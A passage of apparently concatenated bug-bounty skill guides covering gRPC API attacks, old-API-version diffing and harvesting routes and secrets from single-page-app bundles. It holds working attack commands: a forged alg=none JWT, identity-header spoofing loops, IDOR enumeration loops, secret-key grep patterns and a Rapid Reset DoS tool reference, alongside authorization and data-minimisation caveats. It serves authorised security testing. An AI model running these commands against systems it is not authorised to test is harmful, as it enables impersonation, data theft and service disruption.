curl -s --http2 -X POST "https://$TARGET/grpc.health.v1.Health/Check" \
  -H "content-type: application/grpc-web+proto" -o /dev/null -D - | grep -i "grpc-status\|content-type"
```

`grpc-status` trailer present ⇒ a gRPC server (or grpc-gateway/Envoy) is behind that port. `UNIMPLEMENTED` on a random path is normal and only confirms the transport — not a finding.

---

## Phase 2 — Service Enumeration via Reflection

```bash
brew install grpcurl   # or: go install github.com/fullstorydev/grpcurl/cmd/grpcurl@latest

# List services — -plaintext for h2c, -insecure for self-signed TLS, plain for valid TLS
grpcurl -plaintext $TARGET:50051 list
grpcurl -insecure  $TARGET:443   list

# List + describe every method of each service
grpcurl -plaintext $TARGET:50051 list admin.AdminService
grpcurl -plaintext $TARGET:50051 describe admin.AdminService.DeleteUser
grpcurl -plaintext $TARGET:50051 describe .admin.DeleteUserRequest   # message schema

# Dump the whole catalog to triage interesting surfaces
for SVC in $(grpcurl -plaintext $TARGET:50051 list); do
  echo "== $SVC =="; grpcurl -plaintext $TARGET:50051 list "$SVC"
done | tee grpc-catalog.txt
grep -iE 'admin|internal|debug|secret|impersonate|exec|migrate|reset|delete' grpc-catalog.txt
```

**Reflection disabled?** You can still call known methods if you can guess them, or rebuild the descriptor set from a leaked `.proto` (Phase 5) and pass it with `grpcurl -protoset bundle.bin ...`. Reflection-off is a hardening control, not a security boundary.

---

# Baseline: call a sensitive method with NO auth metadata
grpcurl -plaintext $TARGET:50051 -d '{}' admin.AdminService/ListUsers

# IDOR across an enumerable id field
for ID in 1 2 3 100 1000 1001; do
  echo "id=$ID"; grpcurl -plaintext $TARGET:50051 \
    -d "{\"user_id\": $ID}" user.UserService/GetUser 2>&1 | head -4
done
```

**Interpret the gRPC status code, not just whether bytes came back (see Validation):**
- `OK` + populated response → method executed unauthenticated → finding.
- `Unauthenticated (16)` / `PermissionDenied (7)` → authz is enforced; NOT a finding.
- `Unimplemented (12)` → wrong path / method not on this server.
- `InvalidArgument (3)` → reached and parsed your input → method is callable; fix the payload and retry.

---

# (a) Forged bearer / alg=none JWT in the authorization metadata
grpcurl -plaintext $TARGET:50051 \
  -H "authorization: Bearer eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4iLCJzdWIiOiIxIn0." \
  -d '{}' admin.AdminService/GetConfig

# (b) Backend-trusts-proxy headers: many gRPC backends authenticate at Envoy and

#     then trust identity injected as metadata. If the edge does not STRIP these,

#     spoofing them = full impersonation. Test every plausible name:
for H in "x-user-id: 1" "x-authenticated-user: admin" "x-tenant-id: 0" \
         "x-internal-request: true" "x-forwarded-for: 127.0.0.1" \
         "x-envoy-internal: true" "grpc-internal-encoding-request: true"; do
  echo "== $H =="
  grpcurl -plaintext $TARGET:50051 -H "$H" -d '{}' internal.InternalService/GetSecrets 2>&1 | head -3
done

#     server; some auth middlewares only inspect text metadata, missing -bin keys.
grpcurl -plaintext $TARGET:50051 -H "auth-token-bin: $(printf admin|base64)" \
  -d '{}' admin.AdminService/GetConfig
```

The metadata-stripping bug (b) is the gRPC-specific crown jewel: confirm it by sending the spoofed header **directly to the backend port** AND, separately, **through the public proxy** — if the proxy forwards your `x-user-id` unchanged to the backend, it is exploitable for real users, not just on the bypassed port.

---

# Proxies (Envoy/grpc-gateway) sometimes serve descriptors or swagger
for P in proto api/proto swagger.json openapiv2 service.swagger.json descriptor.pb; do
  S=$(curl -s -o /dev/null -w '%{http_code}' "https://$TARGET/$P")
  [ "$S" != 404 ] && echo "Found: /$P ($S)"
done

# Source/registry leakage of .proto definitions
gh search code --owner "$TARGET_ORG" 'syntax = "proto3"' --limit 20 2>/dev/null
gh search code --owner "$TARGET_ORG" 'service ' filename:.proto --limit 20 2>/dev/null

# Rebuild a descriptor set from leaked protos and drive the API without reflection
protoc --descriptor_set_out=bundle.bin --include_imports -I proto/ proto/*.proto
grpcurl -protoset bundle.bin -plaintext $TARGET:50051 list
```

Proto leakage on its own is low severity; its value is as the key that unlocks Phases 3–4 against a reflection-disabled target.

---

## Phase 6 — gRPC-Web / grpc-gateway / JSON-Transcoding Attacks

gRPC almost always reaches the browser through a transcoder: **Envoy `grpc_web`/`grpc_json_transcoder`**, **grpc-gateway** (REST↔gRPC), or **Connect**. These translators are the realistic external attack surface and frequently re-expose internal methods.

```bash

# (a) grpc-gateway maps gRPC methods to REST. Reflection-derived method names often

#     map predictably — hit them over plain HTTP/JSON (no gRPC client needed):
curl -s -X POST "https://$TARGET/v1/admin/users:list" -H 'content-type: application/json' -d '{}'
curl -s -X POST "https://$TARGET/admin.AdminService/ListUsers" \
  -H 'content-type: application/json' -d '{}'    # default unannotated route

#     Frame = 1-byte flag (0x00=data) + 4-byte big-endian length + protobuf payload.

#       protoscope -s <<<'1: 1'  > msg.bin          # field 1 (e.g. user_id) = 1
MSG=$(xxd -p msg.bin | tr -d '\n')
LEN=$(printf '%08x' $((${#MSG}/2)))                 # 4-byte length prefix
FRAME=$(printf '00%s%s' "$LEN" "$MSG")
echo "$FRAME" | xxd -r -p > frame.bin
curl -s "https://$TARGET/user.UserService/GetUser" \
  -H 'content-type: application/grpc-web+proto' -H 'x-grpc-web: 1' \
  --data-binary @frame.bin | xxd | head

# (c) grpc-web+json variant (Envoy/Connect) — no manual framing needed:
curl -s "https://$TARGET/user.UserService/GetUser" \
  -H 'content-type: application/grpc-web+json' -H 'x-grpc-web: 1' \
  -d '{"user_id": 1}'

# (d) Connect protocol (buf): plain JSON POST, unary, no framing:
curl -s "https://$TARGET/user.UserService/GetUser" \
  -H 'content-type: application/json' -H 'connect-protocol-version: 1' \
  -d '{"user_id": 1}'
```

Why this matters: the browser-facing transcoder commonly forwards to the SAME backend as the internal gRPC plane. If the transcoder route exposes `AdminService` or fails to require the auth the gRPC client would have sent, you have a real, externally-reachable authz bug. Confirm each transcoded route returns `OK` with sensitive data, and verify it is reachable as an unauthenticated/low-priv user (not just from inside the mesh).

---

## Phase 7 — HTTP/2 Rapid Reset DoS (CVE-2023-44487)

**Authorization gate:** DoS is out of scope on the overwhelming majority of programs. Do NOT run this without explicit, written, scoped permission and a target/window the program owner agreed to. Skip to Validation if unsure.

The attack is NOT a load test. It opens streams (HEADERS) and immediately cancels them (RST_STREAM) before the server finishes, so each cancelled stream frees a `MAX_CONCURRENT_STREAMS` slot instantly while the server still spends work on it — the client races far ahead of the concurrency cap. `h2load`/`ghz` are throughput benchmarkers; **they have no rapid-reset mode and never interleave HEADERS+immediate-RST_STREAM, so they cannot test this.**

**Correct tooling — author-sanctioned PoCs that actually emit the frame pattern:**
```bash

#   https://blog.cloudflare.com/technical-breakdown-http2-rapid-reset-ddos-attack/  (Cloudflare writeup)

# Go PoC that sends HEADERS then immediate RST_STREAM in a tight loop:
git clone https://github.com/secengjeff/rapidresetclient
cd rapidresetclient && go build -o rapidreset .

# Detection-only: a SHORT, low-count burst, with permission, then STOP:
./rapidreset --help    # confirm current flags first, then a SMALL authorized burst, e.g.:

# to write a HEADERS frame immediately followed by RST_STREAM(CANCEL) per stream id.
```

**Detection without DoSing — prefer this:** the only thing you need to PROVE is whether mitigations are present. Check the server banner / version and whether it tracks reset floods:
```bash

# Fingerprint the HTTP/2 implementation and version (patched versions are known):
curl -sI --http2 https://$TARGET/ | grep -i '^server:'

# grpc-go >=1.56.3/1.57.1/1.58.3 are mitigated. Version-match instead of flooding.
```
Report the *version-confirmed* mitigation gap rather than a benchmark slowdown. "Server got slower under load" is not proof of CVE-2023-44487 — it produces false positives on slow/under-provisioned servers and false negatives on patched ones that throttle resets gracefully.

---

## Tools

```bash
grpcurl   # primary CLI client (list/describe/call, -protoset for reflection-off)
grpcui    # web UI for interactive exploration:  grpcui -plaintext $TARGET:50051
protoc + protoscope   # build/inspect raw protobuf and gRPC-Web frames (Phase 6)
buf       # lint/inspect proto, drive Connect endpoints

# DoS-only, AUTHORIZED engagements: secengjeff/rapidresetclient (true rapid-reset PoC).

#   NOTE: ghz and h2load are LOAD benchmarkers, NOT rapid-reset testers — do not

## Chain Table

| gRPC finding | Chain to | Impact |
|--------------|----------|--------|
| Reflection enabled | Enumerate all internal service methods + messages | Full API catalog disclosure (enabler) |
| Admin method, no auth | Call privileged RPCs (`DeleteUser`, `GetConfig`) | Data manipulation / system access — Critical |
| Proxy forwards `x-user-id`/`x-tenant-id` unstripped | Spoof identity metadata → cross-tenant impersonation | Tenant isolation bypass — Critical |
| IDOR via enumerable id field | Iterate `user_id` over `GetUser` | Mass PII exfil — High |
| grpc-gateway / gRPC-Web route re-exposes internal RPC | Hit transcoded REST/JSON path unauth | Externally-reachable authz bypass — High/Critical |
| Plaintext h2c on internal port | MITM / sniff metadata (bearer tokens) | Credential capture — High |
| `.proto` leak (repo/swagger) | `-protoset` to drive reflection-off target | Unlocks Phases 3–4 — Low alone, High as enabler |

Related skills: **hunt-idor** (id enumeration logic), **hunt-api-misconfig** (JWT alg=none / mass-assignment in request messages), **hunt-auth-bypass** (edge-vs-backend trust boundary), **hunt-tls-network** (h2c/plaintext + ALPN), **cloud-iam-deep** (if a called RPC returns cloud creds).

---

## Validation — false-positive discipline

gRPC's failure modes look like successes to a naive `grep`. Apply these gates before any submission.

1. **Status-code discrimination, not byte-counting.** A non-empty response can still be an error frame. Confirm the `grpc-status` trailer is `0` (OK). `Unauthenticated (16)` / `PermissionDenied (7)` mean auth WORKS — close the candidate. `Unimplemented (12)` means you have the wrong method. Re-run with `grpcurl -v` and read the trailers explicitly.

2. **Reflection / health endpoints are often intentionally public.** `grpc.reflection.*` and `grpc.health.v1.Health` being reachable is, by itself, **info disclosure (Low/Medium at most)** — many vendors ship reflection on by design. Do NOT report it as "missing auth" unless it leaks a non-public service catalog. The finding is the *sensitive* service you can then call without auth, proven in Phase 3.

3. **Distinguish "no auth" from "auth not required for THIS method."** Some methods (health, public catalog reads) are legitimately anonymous. Prove the bug by showing an authenticated-vs-unauthenticated **state delta**: the same RPC returns another user's/tenant's private data without credentials, or a mutating admin RPC executes (re-read the changed state to confirm side-effect).

4. **Proxy-vs-backend reachability.** A bug reachable only by hitting an internal `:50051` you found via SSRF/port-scan is real but its severity depends on reachability. State explicitly how an external attacker reaches it (exposed port, SSRF egress, proxy passthrough). For metadata-spoofing, prove the PUBLIC proxy forwards the spoofed header — not just the bypassed backend port.

5. **OOB / Collaborator for anything blind.** If an RPC takes a URL/host argument (webhook, import, render), it is an SSRF candidate: point it at a Burp Collaborator payload with a unique subdomain and confirm the DNS+HTTP interaction before claiming SSRF. No interaction = no SSRF. Hand off to **hunt-ssrf**.

6. **DoS is authorization-gated and version-verifiable.** Never submit CVE-2023-44487 off a benchmark "slowdown." Either (a) version-match an unpatched HTTP/2 stack from the `server:` banner, or (b) demonstrate the reset-flood ONLY under explicit written authorization with an agreed window — then stop immediately. A slow response is not proof.

**Severity guide (after the gates above pass):**
- Sensitive/admin RPC callable with no auth, side-effect proven → **Critical**
- Proxy-forwarded metadata spoofing → cross-tenant impersonation → **Critical**
- IDOR / mass PII via enumerable RPC → **High**
- Internal service externally reachable (transcoder or open port) → **High**
- Plaintext h2c leaking bearer metadata → **High**
- Reflection enabled exposing non-public catalog → **Medium** (enabler)
- Proto/descriptor leak, no callable sensitive method → **Low**


## SOURCE: hunt-skills/hunt-shadow-api/SKILL.md

## OWASP API9 — Improper Inventory Management (Shadow / Zombie APIs)

As an API evolves, old versions and internal/staging routes routinely stay reachable without
receiving the same security fixes as the current version — because nobody tracks that they
still exist. The bug is rarely in one endpoint; it's in the **delta** between what an old
version enforces and what the current version enforces on the same operation.

### When to use

Trigger when:
- Versioned paths are visible (`/v1/`, `/v2/`, `/api/2023-01-01/`) or `Accept`/`X-API-Version`
  headers are in play.
- A changelog, release notes, or deprecation notice references removed/old API behavior.
- A mobile APK/IPA (via `apk-redteam-pipeline` / `ios-redteam-pipeline`) hardcodes endpoints
  that look like an older backend version than the current web app calls.
- Multiple OpenAPI/Swagger specs are discoverable, or `info.version` in one spec implies others
  exist.

DO NOT use for single-version APIs with no version history — there's nothing to diff; go
straight to `hunt-api-misconfig` for direct exploitation of the one surface that exists.

---

# Path-based versioning
for v in v1 v2 v3 v4 beta alpha internal legacy old 2022-01-01 2023-01-01 2024-01-01; do
  curl -s -o /dev/null -w "%{http_code} /api/$v/\n" "https://$TARGET/api/$v/"
done

# Header-based versioning
curl -s -H "X-API-Version: 1" https://$TARGET/api/users
curl -s -H "Accept: application/vnd.company.v1+json" https://$TARGET/api/users

# Subdomain-based versioning
for sub in api api-v1 api-v2 apiv1 apiv2 legacy-api old-api internal-api staging-api; do
  curl -s -o /dev/null -w "%{http_code} $sub\n" "https://$sub.$TARGET/"
done
```

A `200`/`401`/`403` on an old version path (anything but `404`/connection-refused) means the
version is still live and worth carrying into Stage 3, even if it demands auth.

---

## Stage 2 — Pull Every Reachable Spec, Not Just the Linked One

```bash
for path in openapi.json swagger.json v1/swagger.json v2/swagger.json v3/api-docs \
            api-docs.json swagger/v1/swagger.json .well-known/openapi.json; do
  curl -s -o /dev/null -w "%{http_code} /$path\n" "https://$TARGET/$path"
done

# Wayback Machine — a DEPRECATED version's spec often stays indexed after the live link is removed
curl -s "http://web.archive.org/cdx/search/cdx?url=$TARGET/*swagger*&output=json&collapse=urlkey"
curl -s "http://web.archive.org/cdx/search/cdx?url=$TARGET/*openapi*&output=json&collapse=urlkey"
```

When more than one spec resolves (a current one and an archived/old one), diff the endpoint
inventories directly:
```bash
jq -r '.paths | keys[]' v1-swagger.json | sort > /tmp/v1_paths.txt
jq -r '.paths | keys[]' v2-swagger.json | sort > /tmp/v2_paths.txt
comm -23 /tmp/v1_paths.txt /tmp/v2_paths.txt   # in v1 only — candidates for "still live but forgotten"
```
For every path in that diff, confirm it's still reachable against the v1 base URL. A route
documented only in the old spec that still returns something other than `404` is a zombie-
endpoint candidate — carry it into Stage 3.

---

## Stage 3 — Behavioral Diff Between Old and Current Version

For each operation that exists in **both** versions, compare security-relevant behavior, not
response shape. Response shape differences are Informational; behavioral security regressions
are the finding.

- **Auth strength.** Does the old version accept no token, an expired token, or a lower-
  privilege token that the current version rejects?
  ```bash
  curl -s -H "Authorization: Bearer $EXPIRED_TOKEN" https://$TARGET/api/v1/users/me -w '\n%{http_code}\n'
  curl -s -H "Authorization: Bearer $EXPIRED_TOKEN" https://$TARGET/api/v2/users/me -w '\n%{http_code}\n'
  ```
- **Rate limiting.** Burst the same number of requests against both versions' equivalent
  endpoint; a missing `429` on the old version means rate-limiting was added later and never
  backported.
- **Input validation.** Send the identical injection/oversized/malformed payload to both; the
  old version accepting what the new one rejects means hardening happened forward-only —
  chain into whichever injection class the payload targets (`hunt-sqli`, `hunt-idor`, etc.).
- **Field exposure.** Does the old version's response body include fields — internal IDs, other
  users' data, internal notes, PII — that the current version has since redacted?

---

## Stage 4 — Deprecated / Internal Routes Never Referenced by the Current UI

- Grep JS bundles for API calls no visible UI flow triggers (`/internal/`, `/admin/`, `/debug/`,
  `/_internal/`, `/test/`, `/staging/`) — reuse `hunt-source-leak`'s JS-bundle grep patterns for
  this specifically.
- Check `robots.txt` / `sitemap.xml` for disallowed API paths — a self-inflicted disclosure.
- Mobile-app endpoint inventories (via `apk-redteam-pipeline` / `ios-redteam-pipeline`) very
  often reference an older backend version than the current web app calls. Treat every
  APK/IPA-sourced endpoint as a version-diff candidate against the live web API.

---

## False-Positive Gate

- A version difference alone (different response shape, cosmetic field renaming) is
  Informational. The finding is a **security-relevant regression** — auth, rate-limit, or
  validation that got weaker going backward in version history.
- Confirm the old endpoint is not simply an alias/proxy to the current implementation before
  claiming a behavioral difference — send a payload that would actually behave differently
  under old vs. new logic, not just compare a version string in the response body.
- A `200` on a path that just serves a static "this API version is deprecated, use v2" message
  is not a finding — confirm the underlying operation still executes.

---

## Severity Table

| Finding | Severity |
|---|---|
| Old version bypasses auth entirely where current version requires it | Critical |
| Old version missing rate-limit present on current version | Medium–High (chain via `hunt-brute-force`) |
| Old version leaks extra fields (PII, internal IDs) vs. current | Medium–High |
| Old version accepts payloads the current version now validates/sanitizes | High (chain to the underlying injection class) |
| Version is reachable but behaviorally identical to current | Informational |

---

## Related Skills & Chains

- **`hunt-api-misconfig`** — owns exploitation once a spec or endpoint is in hand (mass
  assignment, JWT attacks, OData, Swagger-chain attacks). This skill hands it a sharper target:
  "here's a zombie endpoint with weaker validation than the current one."
- **`hunt-subdomain`** — owns host/subdomain-level discovery (`api-v1.target.com` as its own
  host, potential takeover). This skill owns what happens once you're inside a given host's
  version surface.
- **`hunt-source-leak`** — JS-bundle grep for internal/undocumented calls; reused here
  specifically for version-diffing rather than secret extraction.
- **`apk-redteam-pipeline`** / **`ios-redteam-pipeline`** — mobile builds routinely hardcode an
  older API version; every mobile-sourced endpoint is a version-diff candidate.
- **`hunt-brute-force`** — a rate-limit regression found here is only a complete finding once
  chained to actual brute-forceable impact (login, OTP, enumeration).


## SOURCE: hunt-skills/hunt-spa-api/SKILL.md

## When to use this skill

Trigger when:
- A target host returns a tiny HTML shell + big `/static/js/*.js` or `/_next/static/*` bundles (React/Vue/Angular/Next/Svelte SPA)
- You see a subdomain named `console`, `app`, `dashboard`, `portal`, `admin`, `panel`, `manage`, `internal`
- Recon surfaces any `*api*`, `*-api*`, `api.*` host
- A login page is OAuth/SSO-gated (the *frontend* auth tells you nothing about whether the *API* enforces auth)

The core insight: **a SPA is a client to a backend API, and it ships the full map of that API — hosts, routes, sometimes keys — to anyone who views source.** The login page being protected says nothing about whether the API behind it checks tokens. Auth is frequently enforced on the *gateway/login* and missing on a *route group* of the API.

DO NOT skip this because "the app needs login" — that's exactly when this pays off.

---

### 1. Pull the shell + enumerate the bundles
```bash
curl -s https://console.target.com/ -o index.html

# generic:
grep -oiE 'src="[^"]+\.js[^"]*"' index.html
```
Download every bundle (they can be multi-MB — that's fine, it's all route data):
```bash
mkdir bundles
for j in $(grep -oE '/static/js/[^"]+\.js' index.html | sort -u); do
  curl -s "https://console.target.com$j" -o "bundles/$(echo "$j"|tr '/' '_')"
done
```

### 2. Harvest API hosts, routes, and secrets from the bundles
```bash
B=bundles/*.js

# Backend API hosts (incl. dev/beta/staging variants — often weaker auth)
grep -ohiE 'https://[a-z0-9.-]*(api|console|backend|service)[a-z0-9.-]*\.target\.com[a-z0-9/_-]*' $B | sort -u

# Route literals — minified bundles store routes as STRING segments, not full URLs.

# Grep for quoted "resource/action" strings:
grep -ohiE '"[a-z0-9_-]+/[a-z0-9_/-]+"' $B | tr -d '"' \
  | grep -iE '(login|user|account|order|billing|invoice|payment|deal|report|token|otp|password|reset|admin|profile|auth|upload|export|role|permission|dashboard|wallet|finance|sales)' | sort -u

# Secrets (validate before trusting — most AIza keys are Maps/analytics, not Auth)
grep -ohiE '(AIza[0-9A-Za-z_-]{35}|AKIA[0-9A-Z]{16}|sk_live_[0-9A-Za-z]+|eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}|apiKey["'"'"']?\s*[:=]\s*["'"'"'][^"'"'"']+)' $B | sort -u
```
**Note:** minifiers store routes as concatenated string segments (e.g. `"account/payment/list"`), NOT full `/api/v2/...` URLs — so a naive `/api/v*` grep returns nothing. Grep for the **resource-word route strings** and prepend the base yourself.

**Lazy-loaded (async) chunks — don't stop at HTML-referenced bundles.** CRA/webpack SPAs reference only runtime+main+vendor in index.html; numbered async route chunks are named inside main.js's chunk map and loaded at runtime, so grepping only `/static/js/*.js` from the shell truncates route coverage to eager chunks.
```bash
grep -oE '[0-9]+:"[a-f0-9]+"' bundles/*main*.js        # {chunkId:"hash"} pairs

# reconstruct /static/js/<id>.<hash>.chunk.js, download each, re-run route/host/secret harvest

### 3. Establish a CONTROL — find an endpoint that IS gated
Before declaring anything vulnerable, send an unauthenticated request to an endpoint you expect to be protected, and capture what *correct* rejection looks like:
```bash
curl -s -X POST https://api.target.com/api/users -H 'Content-Type: application/json' -d '{}'

# secure → {"error":"Missing or invalid authorization header"} or HTTP 401
```
This is your differential. A sibling API (e.g. a second API host, or a different route group on the same host) is the ideal control — same stack, so a different response = real authz gap, not a quirk.

### 4. Test each route family UNAUTHENTICATED, both methods
For every discovered route, send it with **no `Authorization` header** and compare to the control:
```bash
for r in <routes>; do
  curl -s -o /tmp/r -w "[%{http_code}] $r\n" -X POST -H 'Content-Type: application/json' -d '{}' "https://api.target.com/api/v2/$r"
done
```
Interpret:
- **`401`/`"Missing authorization"`** → gated (correct). Move on.
- **`200` with data** → unauthenticated data exposure. **Finding.**
- **`400 "field X is mandatory"`** → the route processed your request and reached *business-logic validation* without an auth check → **auth bypass; supply the field minimally to confirm.**
- **`200` + verbose DB/stack error** (e.g. `PROCEDURE db_x.sp_y does not exist`) → reached the data layer unauthenticated; also a SQLi-surface signal.
- **Mandatory fields named like `is_admin` / `is_internal` / `requested_by` / `role_id` / `account_type`** → **authorization derived from client-supplied parameters** — set the privilege flag and you self-elevate. Critical-class.

### 5. Pivot & prove (minimally)
- IDs returned by one endpoint (`account_id`, `order_id`, `deal_id`) are the keys the *other* endpoints consume — they prove the whole router is reachable, not just one route.
- Test `dev-`/`beta-`/`staging-` API variants — they frequently have weaker/disabled auth.
- Check the response headers: `Access-Control-Allow-Origin: *` compounds the issue (any web origin reads it from a victim's browser).
- **STOP at minimum-necessary proof.** A handful of records (or a `totalCount`) confirms the missing check. Do NOT enumerate the table — see `redteam-mindset` data-minimization boundary. The finding is the absent auth, not the data volume.

---

## What "the API behind the SSO login" really means

A common, dangerous architecture:
- `console.target.com` (the SPA) → login is **Entra/Okta/Google OAuth** (looks airtight).
- `api.target.com` (the backend) → some route groups enforce the bearer token, **some route groups forgot the middleware.**

The frontend login is theatre if the API doesn't independently validate the token on every route. Always test the API directly, bare, regardless of how locked-down the login UI is.

---

## Anti-patterns

- **"The app requires login, so the API must be protected."** No — test the API directly, unauthenticated. The whole point.
- **"Minified bundle, can't read it."** You don't need to read it — grep it for hosts/routes/secrets. 5 minutes.
- **"`/api/v1/foo` returned 404, so no API here."** Wrong base or wrong method. Try `/api/`, `/api/v2/`, POST not GET, and the exact route strings from the bundle (Express's 404 echoes the path — use it to calibrate).
- **"AIza key found → critical secret."** Validate first — most are Maps/analytics keys (`CONFIGURATION_NOT_FOUND` on identitytoolkit = not Auth-enabled). Don't over-claim.
- **Dumping the whole dataset once you get a 200.** Stop at PoC. (`redteam-mindset`.)
- **Account-creation / write endpoints as "proof".** Read endpoints prove the auth gap without creating state. Never POST a `create`/`signup`/`upload` to "demonstrate" — that's a destructive write needing explicit per-action authorization.

---

## Related Skills & Chains

- **`hunt-api-misconfig`** — once the API is mapped, run the broader misconfig matrix (method tampering, mass assignment, JWT alg confusion) per route.
- **`hunt-idor`** — the `account_id`/`order_id` pivots feed straight into IDOR testing across discovered routes.
- **`hunt-source-leak`** — sourcemaps (`*.js.map`) reconstruct original source for deeper route/secret extraction; same harvesting muscle.
- **`hunt-nextjs`** — for Next.js targets, layer the middleware-bypass (`x-middleware-subrequest`) and `/_next/data` route tests on top of this.
- **`redteam-mindset`** — the data-minimization boundary governs step 5: prove the missing check, don't exfiltrate the table.
- **`recon-scope-triage`** — verify the API host actually belongs to the target before testing (don't pop a same-named third party's API).
